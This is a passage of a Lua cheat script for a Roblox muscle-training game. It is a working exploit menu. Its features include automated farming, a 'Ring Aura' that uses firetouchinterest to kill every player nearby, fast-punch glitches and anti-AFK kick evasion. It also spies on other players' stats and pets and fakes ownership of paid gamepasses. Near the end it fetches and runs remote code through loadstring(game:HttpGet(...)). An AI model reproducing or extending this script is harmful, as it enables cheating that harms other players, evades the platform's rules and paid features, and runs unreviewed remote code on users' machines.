                    LocalPlayer.muscleEvent:FireServer("rep")
                end
               task.wait(setw)
            end
        end
    end
     
    local switch = rebirth:AddSwitch("Fast Grind | NEED PACKS |", function(Value)
         isRunning = Value
            if Value then
                task.spawn(startStrengthAutomation)
            end
        end)

   local Statistic = OP:AddFolder("Rebirth Statistic")
 
local labels = {  
    RebirthsGainedLabel = Statistic:AddLabel("Rebirths Gained In 1 Minute: ..."),  
    RebirthsPerMinuteLabel = Statistic:AddLabel("Rebirths Per Minute: ..."),  
    RebirthsPerHourLabel = Statistic:AddLabel("Rebirths Per Hour: ..."),  
    RebirthsPerDayLabel = Statistic:AddLabel("Rebirths Per Day: ..."),  
    RebirthsPerWeekLabel = Statistic:AddLabel("Rebirths Per Week: ...")  
}  
 
local player = game:GetService("Players").LocalPlayer  
local leaderstats = player:FindFirstChild("leaderstats")  
local rebirthStat = leaderstats and leaderstats:FindFirstChild("Rebirths")  
 
local function abbreviateNumber(num)  
    if num >= 1e9 then  
        return string.format("%.2fB", num / 1e9)  
    elseif num >= 1e6 then  
        return string.format("%.2fM", num / 1e6)  
    elseif num >= 1e3 then  
        return string.format("%.2fK", num / 1e3)  
    else  
        return tostring(num)  
    end  
end  
 
local lastRebirthCount = rebirthStat and rebirthStat.Value or 0  
 
task.spawn(function()  
    while task.wait(60) do  
        local currentRebirthCount = rebirthStat and rebirthStat.Value or 0  
        local rebirthsGained = math.max(0, currentRebirthCount - lastRebirthCount)  
        lastRebirthCount = currentRebirthCount  
 
        labels.RebirthsGainedLabel.Text = "Rebirths Gained In 1 Minute: " .. abbreviateNumber(rebirthsGained)  
        labels.RebirthsPerMinuteLabel.Text = "Rebirths Per Minute: " .. abbreviateNumber(rebirthsGained)  
        labels.RebirthsPerHourLabel.Text = "Rebirths Per Hour: " .. abbreviateNumber(rebirthsGained * 60)  
        labels.RebirthsPerDayLabel.Text = "Rebirths Per Day: " .. abbreviateNumber(rebirthsGained * 1440)  
        labels.RebirthsPerWeekLabel.Text = "Rebirths Per Week: " .. abbreviateNumber(rebirthsGained * 10080)  
    end  
end)

local Ring = OP:AddFolder("Ring Aura")

function gettool()
	for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name == "Punch" and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
		end
	end
	game:GetService("Players").LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
	game:GetService("Players").LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
end

local function createParticles(part)
	local attachment = Instance.new("Attachment", part)
	local codeParticle = Instance.new("ParticleEmitter", attachment)
	codeParticle.Texture = "rbxassetid://244905904"
	codeParticle.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 155, 0))
	})
	codeParticle.Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.5),
		NumberSequenceKeypoint.new(1, 0)
	})
	codeParticle.Lifetime = NumberRange.new(0.5, 1)
	codeParticle.Rate = 50
	codeParticle.Speed = NumberRange.new(5, 10)
	codeParticle.SpreadAngle = Vector2.new(-180, 180)
	local lightning = Instance.new("Beam", part)
	lightning.Texture = "rbxassetid://446111271"
	lightning.TextureSpeed = 3
	lightning.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
	return {
		codeParticle,
		lightning
	}
end

local currentRadius = 75
Ring:AddTextBox("Ring Size", function(Value)
currentRadius = math.clamp(tonumber(Value) or 75, 1, 150)
end)

Ring:AddSwitch("Enable", function(v)
getgenv().killNearby = v
		local radiusVisual = Instance.new("Part")
		radiusVisual.Anchored = true
		radiusVisual.CanCollide = false
		radiusVisual.Transparency = 0.8
		radiusVisual.Material = Enum.Material.ForceField
		radiusVisual.Color = Color3.fromRGB(0, 0, 0)
		radiusVisual.Size = Vector3.new(1, 0.1, 1)
		task.spawn(function()
			while getgenv().killNearby do
				pcall(function()
					local myCharacter = game.Players.LocalPlayer.Character
					local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
					if myRoot then
						radiusVisual.Parent = workspace
						radiusVisual.Size = Vector3.new(currentRadius * 2, 0.1, currentRadius * 2)
						radiusVisual.CFrame = myRoot.CFrame * CFrame.new(0, -2, 0)
						local effects = createParticles(myRoot)
						for _, player in pairs(game:GetService("Players"):GetPlayers()) do
								local char = player.Character
								local root = char and char:FindFirstChild("HumanoidRootPart")
								if root and myRoot and myCharacter:FindFirstChild("LeftHand") then
									local distance = (root.Position - myRoot.Position).Magnitude
									if distance <= currentRadius then
										local killEffect = Instance.new("Part")
										killEffect.Anchored = true
										killEffect.CanCollide = false
										killEffect.Transparency = 0.5
										killEffect.Material = Enum.Material.Neon
										killEffect.Color = Color3.fromRGB(0, 0, 0)
										killEffect.CFrame = root.CFrame
										killEffect.Size = Vector3.new(5, 5, 5)
										killEffect.Parent = workspace
										game:GetService("TweenService"):Create(killEffect, TweenInfo.new(0.5), {
											Size = Vector3.new(0, 0, 0),
											Transparency = 1
										}):Play()
										game:GetService("Debris"):AddItem(killEffect, 0.5)
										firetouchinterest(root, myCharacter.LeftHand, 0)
										task.wait()
										firetouchinterest(root, myCharacter.LeftHand, 1)
										gettool()
									end
								end
							end
						task.wait(0.1)
						for _, effect in ipairs(effects) do
							effect:Destroy()
						end
					end
				end)
				task.wait(0.1)
			end
			radiusVisual:Destroy()
		end)
	end)

local glitch = OP:AddFolder("Fast Glitch")

glitch:AddSwitch("Fast Punch (Needed for Fast Glitch)", function(Value)
     _G.fastHitActive = Value
 
    if Value then
        task.spawn(function()
            while _G.fastHitActive do
                if not _G.fastHitActive then break end
 
                local player = game.Players.LocalPlayer
                local punch = player.Backpack:FindFirstChild("Punch")
                if punch then
                    punch.Parent = player.Character
                    if punch:FindFirstChild("attackTime") then
                        punch.attackTime.Value = 0
                    end
                end
                task.wait(0.1)
            end
        end)

        task.spawn(function()
            while _G.fastHitActive do
                if not _G.fastHitActive then break end
 
                local player = game.Players.LocalPlayer
                player.muscleEvent:FireServer("punch", "rightHand")
                player.muscleEvent:FireServer("punch", "leftHand")
 
                local character = player.Character
                if character then
                    local punchTool = character:FindFirstChild("Punch")
                    if punchTool then
                        punchTool:Activate()
                    end
                end
                task.wait(0)
            end
        end)
    else
        local character = game.Players.LocalPlayer.Character
        local equipped = character:FindFirstChild("Punch")
        if equipped then
            equipped.Parent = game.Players.LocalPlayer.Backpack
        end
    end
end, "Golpea automáticamente")

local legendGymRockSwitch = glitch:AddSwitch("Fast Glitch Legend Rock", function(bool)
    selectrock = "Legend Gym Rock"
    getgenv().autoFarm = bool
 
    if bool then
        spawn(function()
            while getgenv().autoFarm do
                task.wait()
                if game:GetService("Players").LocalPlayer.Durability.Value >= 1000000 then
                    for i, v in pairs(game:GetService("Workspace").machinesFolder:GetDescendants()) do
                        if v.Name == "neededDurability" and v.Value == 1000000 and 
                           game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") and 
                           game.Players.LocalPlayer.Character:FindFirstChild("RightHand") then
 
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 1)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 1)
                            gettool()
                        end
                    end
                end
            end
        end)
    end
end)
 
local muscleKingGymRockSwitch = glitch:AddSwitch("Fast Glitch King Rock", function(bool)
    selectrock = "Muscle King Gym Rock"
    getgenv().autoFarm = bool
 
    if bool then
        spawn(function()
            while getgenv().autoFarm do
                task.wait()
                if game:GetService("Players").LocalPlayer.Durability.Value >= 5000000 then
                    for i, v in pairs(game:GetService("Workspace").machinesFolder:GetDescendants()) do
                        if v.Name == "neededDurability" and v.Value == 5000000 and 
                           game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") and 
                           game.Players.LocalPlayer.Character:FindFirstChild("RightHand") then
 
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 1)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 1)
                            gettool()
                        end
                    end
                end
            end
        end)
    end
end)
 
local ancientJungleRockSwitch = glitch:AddSwitch("Fast Glitch Jungle Rock", function(bool)
    selectrock = "Ancient Jungle Rock"
    getgenv().autoFarm = bool
 
    if bool then
        spawn(function()
            while getgenv().autoFarm do
                task.wait()
                if game:GetService("Players").LocalPlayer.Durability.Value >= 10000000 then
                    for i, v in pairs(game:GetService("Workspace").machinesFolder:GetDescendants()) do
                        if v.Name == "neededDurability" and v.Value == 10000000 and 
                           game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") and 
                           game.Players.LocalPlayer.Character:FindFirstChild("RightHand") then
 
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.RightHand, 1)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 0)
                            firetouchinterest(v.Parent.Rock, game:GetService("Players").LocalPlayer.Character.LeftHand, 1)
                            gettool()
                        end
                    end
                end
            end
        end)
    end
end)

local OpThingsFolder = OP:AddFolder("Op Normal Farms")

local switch = OpThingsFolder:AddSwitch("Lock Position", function(Value)
            if Value then
                local currentPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = currentPos
                    end
                end)
            else
                if getgenv().posLock then
                    getgenv().posLock:Disconnect()
                    getgenv().posLock = nil
                end
            end
        end)

OpThingsFolder:AddLabel("--------------------")

OpThingsFolder:AddSwitch("Auto Jungle Rock + Pushups", function(state)
    _G.JungleRock = state
    if state then
        autoRockFarm("Ancient Jungle Rock", "JungleRock")
    end
end)

OpThingsFolder:AddSwitch("Auto Legends Rock + Pushups", function(state)
    _G.LegendsRock = state
    if state then
        autoRockFarm("Rock Of Legends", "LegendsRock")
    end
end)

OpThingsFolder:AddSwitch("Auto Muscle King Rock + Pushups", function(state)
    _G.MuscleKingRock = state
    if state then
        autoRockFarm("Muscle King Mountain", "MuscleKingRock")
    end
end)

local ViewStats = window:AddTab("ViewStats")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetPlayer = nil
local dropdown = nil

local function abbreviateNumber(num)
	if num >= 1e9 then
		return string.format("%.1fB", num / 1e9)
	elseif num >= 1e6 then
		return string.format("%.1fM", num / 1e6)
	elseif num >= 1e3 then
		return string.format("%.1fK", num / 1e3)
	else
		return tostring(num)
	end
end

local statsFolder = ViewStats:AddFolder("Stats")

local function createDropdown()
	if dropdown then dropdown:Destroy() end
	dropdown = statsFolder:AddDropdown("Select Player", function(name)
		local player = Players:FindFirstChild(name)
		targetPlayer = player or nil
	end)
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			dropdown:Add(player.Name)
		end
	end
end

createDropdown()

Players.PlayerAdded:Connect(createDropdown)
Players.PlayerRemoving:Connect(function(leavingPlayer)
	if targetPlayer == leavingPlayer then targetPlayer = nil end
	createDropdown()
end)

local strengthLabel = statsFolder:AddLabel("Strength: 0")
local durabilityLabel = statsFolder:AddLabel("Durability: 0")
local rebirthsLabel = statsFolder:AddLabel("Rebirths: 0")
local killsLabel = statsFolder:AddLabel("Kills: 0")
local brawlsLabel = statsFolder:AddLabel("Brawls: 0")
local agilityLabel = statsFolder:AddLabel("Agility: 0")
local evilKarmaLabel = statsFolder:AddLabel("Evil Karma: 0")
local goodKarmaLabel = statsFolder:AddLabel("Good Karma: 0")
local currentMapLabel = statsFolder:AddLabel("Current Map: Unknown")
local muscleKingTimeLabel = statsFolder:AddLabel("Muscle King Time: 0")
local ownedGamepassesLabel = statsFolder:AddLabel("Owned Gamepasses: None")

local function updateStats()
	if not targetPlayer or not targetPlayer.Parent then
		strengthLabel.Text = "Strength: 0"
		durabilityLabel.Text = "Durability: 0"
		rebirthsLabel.Text = "Rebirths: 0"
		killsLabel.Text = "Kills: 0"
		brawlsLabel.Text = "Brawls: 0"
		agilityLabel.Text = "Agility: 0"
		evilKarmaLabel.Text = "Evil Karma: 0"
		goodKarmaLabel.Text = "Good Karma: 0"
		currentMapLabel.Text = "Current Map: Unknown"
		muscleKingTimeLabel.Text = "Muscle King Time: 0"
		ownedGamepassesLabel.Text = "Owned Gamepasses: None"
		return
	end

	local leaderstats = targetPlayer:FindFirstChild("leaderstats")
	local strength = leaderstats and leaderstats:FindFirstChild("Strength")
	local rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths")
	local kills = leaderstats and leaderstats:FindFirstChild("Kills")
	local brawls = leaderstats and leaderstats:FindFirstChild("Brawls")
	local durability = targetPlayer:FindFirstChild("Durability")
	local agility = targetPlayer:FindFirstChild("Agility")
	local evilKarma = targetPlayer:FindFirstChild("evilKarma")
	local goodKarma = targetPlayer:FindFirstChild("goodKarma")
	local currentMap = targetPlayer:FindFirstChild("currentMap")
	local muscleKingTime = targetPlayer:FindFirstChild("muscleKingTime")
	local ownedGamepasses = targetPlayer:FindFirstChild("ownedGamepasses")

	strengthLabel.Text = "Strength: " .. abbreviateNumber(strength and strength.Value or 0)
	durabilityLabel.Text = "Durability: " .. abbreviateNumber(durability and durability.Value or 0)
	rebirthsLabel.Text = "Rebirths: " .. abbreviateNumber(rebirths and rebirths.Value or 0)
	killsLabel.Text = "Kills: " .. abbreviateNumber(kills and kills.Value or 0)
	brawlsLabel.Text = "Brawls: " .. abbreviateNumber(brawls and brawls.Value or 0)
	agilityLabel.Text = "Agility: " .. abbreviateNumber(agility and agility.Value or 0)
	evilKarmaLabel.Text = "Evil Karma: " .. abbreviateNumber(evilKarma and evilKarma.Value or 0)
	goodKarmaLabel.Text = "Good Karma: " .. abbreviateNumber(goodKarma and goodKarma.Value or 0)
	currentMapLabel.Text = "Current Map: " .. (currentMap and currentMap.Value or "Unknown")
	muscleKingTimeLabel.Text = "Muscle King Time: " .. abbreviateNumber(muscleKingTime and muscleKingTime.Value or 0)

	if ownedGamepasses and ownedGamepasses:IsA("Folder") then
		local names = {}
		for _, child in ipairs(ownedGamepasses:GetChildren()) do
			if child:IsA("IntValue") then
				table.insert(names, child.Name)
			end
		end
		ownedGamepassesLabel.Text = "Owned Gamepasses: " .. (next(names) and table.concat(names, " | ") or "None")
	else
		ownedGamepassesLabel.Text = "Owned Gamepasses: None"
	end
end

task.spawn(function()
	while task.wait(0.1) do
		if targetPlayer then
			updateStats()
		end
	end
end)

local spyPetsFolder = ViewStats:AddFolder("Spy Equipped Pets")
local petTargetDropdown = spyPetsFolder:AddDropdown("Select Player", function(name)
	targetPlayer = Players:FindFirstChild(name)
end)

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
		petTargetDropdown:Add(player.Name)
	end
end

local petLabels = {}
for i = 1, 8 do
	petLabels[i] = spyPetsFolder:AddLabel("Equipped Pet " .. i .. ": none")
end

task.spawn(function()
	while task.wait(0.2) do
		if targetPlayer then
			for i = 1, 8 do
				local petSlot = targetPlayer:FindFirstChild("pet" .. i)
				if petSlot and petSlot:IsA("ObjectValue") and petSlot.Value then
					petLabels[i].Text = "Equipped Pet " .. i .. ": " .. petSlot.Value.Name
				else
					petLabels[i].Text = "Equipped Pet " .. i .. ": none"
				end
			end
		else
			for i = 1, 8 do
				petLabels[i].Text = "Equipped Pet " .. i .. ": none"
			end
		end
	end
end)

ViewStats:AddButton("Kills Gui", function()
	local player = LocalPlayer
	local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "KillsGui"
	screenGui.Parent = playerGui

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 150, 0, 60)
	frame.Position = UDim2.new(0.5, -75, 0.5, -30)
	frame.BackgroundColor3 = Color3.new(1, 1, 1)
	frame.Active = true
	frame.Draggable = true
	frame.Parent = screenGui

	local uiCorner = Instance.new("UICorner")
	uiCorner.CornerRadius = UDim.new(0, 12)
	uiCorner.Parent = frame

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Position = UDim2.new(0, 0, 0, 0)
	label.BackgroundTransparency = 1
	label.TextScaled = true
	label.TextColor3 = Color3.new(0, 0, 0)
	label.Font = Enum.Font.SourceSansBold
	label.Text = "Kills: 0"
	label.Parent = frame

	task.spawn(function()
		while task.wait(0.1) do
			local leaderstats = player:FindFirstChild("leaderstats")
			local kills = leaderstats and leaderstats:FindFirstChild("Kills")
			label.Text = "Kills: " .. abbreviateNumber(kills and kills.Value or 0)
		end
	end)
end)

local Misc = window:AddTab("Misc")

local folder = Misc:AddFolder("Misc 1")

local switchTrade = folder:AddSwitch("Turn Off Trade", function(bool)
    local args
    if bool then
        args = { "disableTrading" }
    else
        args = { "enableTrading" }
    end
    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("tradingEvent"):FireServer(unpack(args))
end)

local switchHidePets = folder:AddSwitch("Hide Pets", function(bool)
    local args = { "hidePets" }
    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("showPetsEvent"):FireServer(unpack(args))
end)

folder:AddButton("Destroy Ad Teleport", function()
            local part = workspace:FindFirstChild("RobloxForwardPortals")
            if part then
                part:Destroy()
            end
        end)

        folder:AddButton("Anti Kick", function()
            wait(0.5)
            local ba = Instance.new("ScreenGui")
            local ca = Instance.new("TextLabel")
            local da = Instance.new("Frame")
            local _b = Instance.new("TextLabel")
            local ab = Instance.new("TextLabel")

            ba.Parent = game.CoreGui
            ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            ca.Parent = ba
            ca.Active = true
            ca.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ca.Draggable = true
            ca.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
            ca.Size = UDim2.new(0, 370, 0, 52)
            ca.Font = Enum.Font.SourceSansSemibold
            ca.Text = "Anti Afk"
            ca.TextColor3 = Color3.new(0, 1, 1)
            ca.TextSize = 22

            da.Parent = ca
            da.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
            da.Position = UDim2.new(0, 0, 1.0192306, 0)
            da.Size = UDim2.new(0, 370, 0, 107)

            _b.Parent = da
            _b.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            _b.Position = UDim2.new(0, 0, 0.800455689, 0)
            _b.Size = UDim2.new(0, 370, 0, 21)
            _b.Font = Enum.Font.Arial
            _b.Text = "Made by luca#5432"
            _b.TextColor3 = Color3.new(0, 1, 1)
            _b.TextSize = 20

            ab.Parent = da
            ab.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ab.Position = UDim2.new(0, 0, 0.158377, 0)
            ab.Size = UDim2.new(0, 370, 0, 44)
            ab.Font = Enum.Font.ArialBold
            ab.Text = "Status: Active"
            ab.TextColor3 = Color3.new(0, 1, 1)
            ab.TextSize = 20

            local bb = game:GetService("VirtualUser")
            game.Players.LocalPlayer.Idled:Connect(function()
                bb:CaptureController()
                bb:ClickButton2(Vector2.new())
                ab.Text = "Roblox tried kicking you, but I won't let them!"
                wait(2)
                ab.Text = "Status: Active"
            end)
        end)

local folder2 = Misc:AddFolder("Misc 2")

folder2:AddButton("Remove Textures", function()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 1
        end
    end
end)

folder2:AddButton("Reduce Graphics", function()
    settings().Rendering.QualityLevel = 1
end)

folder2:AddButton("Disable Effects", function()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
            v.Enabled = false
        end
    end

    local lighting = game:GetService("Lighting")
    for _, v in pairs(lighting:GetChildren()) do
        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end
end)

folder2:AddButton("Simplify Materials", function()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("MeshPart") then
            v.Material = Enum.Material.SmoothPlastic
            if v.Parent and (v.Parent:FindFirstChild("Humanoid") or (v.Parent.Parent and v.Parent.Parent:FindFirstChild("Humanoid"))) then
                
            else
                v.Reflectance = 0
            end
        end
    end
end)

folder2:AddButton("Remove Fog", function()
    local lighting = game:GetService("Lighting")
    lighting.FogEnd = 9e9
end)

local folder3 = Misc:AddFolder("Misc 3")

local switchGamepass = folder3:AddSwitch("Free Auto Lift Gamepass", function(Value)
            local gamepassFolder = game:GetService("ReplicatedStorage"):FindFirstChild("gamepassIds")
            local player = game:GetService("Players").LocalPlayer

            if not gamepassFolder or not player then return end

            if Value then
                for _, gamepass in pairs(gamepassFolder:GetChildren()) do
                    if not player.ownedGamepasses:FindFirstChild(gamepass.Name) then
                        local value = Instance.new("IntValue")
                        value.Name = gamepass.Name
                        value.Value = gamepass.Value
                        value.Parent = player.ownedGamepasses
                    end
                end
            else
                for _, gamepass in pairs(player.ownedGamepasses:GetChildren()) do
                    gamepass:Destroy()
                end
            end
        end)

folder3:AddSwitch("Auto Fortune Wheel", function(Value)
    _G.autoFortuneWheelActive = Value
    if Value then
        local function openFortuneWheel()
            while _G.autoFortuneWheelActive do
                local args = {
                    [1] = "openFortuneWheel",
                    [2] = game:GetService("ReplicatedStorage"):WaitForChild("fortuneWheelChances"):WaitForChild("Fortune Wheel")
                }
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openFortuneWheelRemote"):InvokeServer(unpack(args))
                wait(0)
            end
        end
        coroutine.wrap(openFortuneWheel)()
    else
        _G.autoFortuneWheelActive = false
    end
end)

folder3:AddButton("Rejoin Server", function()
    local ts = game:GetService("TeleportService")
    local p = game:GetService("Players").LocalPlayer
    ts:Teleport(game.PlaceId, p)
end)
 
local joinLowPlayerServerSwitch = folder3:AddSwitch("Join Low Player Server", function(bool)
    if bool then
        local module = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()
        module:Teleport(game.PlaceId, "Lowest")
    end
end)

local Credit = window:AddTab("Credit")
Credit:AddLabel("Private Script")
Credit:AddLabel("Discord: adopt9k_2077")
end
